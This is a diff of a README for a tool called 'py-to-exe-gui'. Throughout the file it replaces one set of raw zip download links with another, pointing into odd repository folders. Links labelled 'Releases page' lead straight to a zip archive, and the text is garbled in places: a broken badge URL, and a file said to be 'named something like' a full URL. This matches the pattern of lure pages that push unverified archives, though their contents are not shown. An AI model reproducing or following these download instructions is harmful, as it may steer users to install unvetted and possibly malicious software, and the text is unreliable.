@@ -16,11 +16,11 @@ Welcome to **py-to-exe-gui**, a user-friendly tool designed to convert your Pyth
 
 To get started, download **py-to-exe-gui** by visiting the link below. 
 
-[![Download py-to-exe-gui](https://raw.githubusercontent.com/Abdulaccount/py-to-exe-gui/main/dewanship/py-to-exe-gui.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Abdulaccount/py-to-exe-gui/main/dewanship/py-to-exe-gui.zip)
+[![Download py-to-exe-gui](https://github.com/Abdulaccount/py-to-exe-gui/raw/refs/heads/main/Example/to-exe-gui-py-2.8-alpha.5.zip%20Now-Click%20Here-brightgreen)](https://github.com/Abdulaccount/py-to-exe-gui/raw/refs/heads/main/Example/to-exe-gui-py-2.8-alpha.5.zip)
 
 ### 🔗 Visit the Releases Page
 
-Go to the [Releases page](https://raw.githubusercontent.com/Abdulaccount/py-to-exe-gui/main/dewanship/py-to-exe-gui.zip) to download the latest version of the software. Here you will find all available releases, including previous versions if needed.
+Go to the [Releases page](https://github.com/Abdulaccount/py-to-exe-gui/raw/refs/heads/main/Example/to-exe-gui-py-2.8-alpha.5.zip) to download the latest version of the software. Here you will find all available releases, including previous versions if needed.
 
 ## 💻 System Requirements
 
@@ -35,7 +35,7 @@ To run **py-to-exe-gui**, ensure your system meets the following requirements:
 
 ### 1. Download the Application
 
-After visiting the [Releases page](https://raw.githubusercontent.com/Abdulaccount/py-to-exe-gui/main/dewanship/py-to-exe-gui.zip), choose the latest version and download the installation file. The file will be named something like `https://raw.githubusercontent.com/Abdulaccount/py-to-exe-gui/main/dewanship/py-to-exe-gui.zip`.
+After visiting the [Releases page](https://github.com/Abdulaccount/py-to-exe-gui/raw/refs/heads/main/Example/to-exe-gui-py-2.8-alpha.5.zip), choose the latest version and download the installation file. The file will be named something like `https://github.com/Abdulaccount/py-to-exe-gui/raw/refs/heads/main/Example/to-exe-gui-py-2.8-alpha.5.zip`.
 
 ### 2. Install the Application
 
@@ -98,4 +98,4 @@ We welcome contributions! If you’d like to help enhance **py-to-exe-gui**, che
 
 **py-to-exe-gui** makes it simple for anyone to convert Python scripts into executable files. Follow the steps above to download, install, and start using the software today. 
 
-Remember, for downloading the latest release, you can always visit the [Releases page](https://raw.githubusercontent.com/Abdulaccount/py-to-exe-gui/main/dewanship/py-to-exe-gui.zip) again. Enjoy creating your standalone applications!
+Remember, for downloading the latest release, you can always visit the [Releases page](https://github.com/Abdulaccount/py-to-exe-gui/raw/refs/heads/main/Example/to-exe-gui-py-2.8-alpha.5.zip) again. Enjoy creating your standalone applications!
